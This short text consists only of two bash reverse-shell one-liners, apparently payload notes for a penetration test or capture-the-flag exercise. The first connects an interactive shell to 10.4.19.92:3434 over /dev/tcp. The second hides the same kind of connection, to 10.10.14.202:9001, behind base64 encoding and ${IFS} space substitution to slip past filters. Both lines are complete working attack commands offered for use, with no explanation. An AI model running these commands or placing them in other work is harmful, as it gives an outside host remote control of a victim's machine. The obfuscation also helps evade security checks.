bash -c 'exec bash -i &>/dev/tcp/10.4.19.92/3434 <&1'

bash -c echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMDIvOTAwMSAwPiYx|base64${IFS}-d|bash
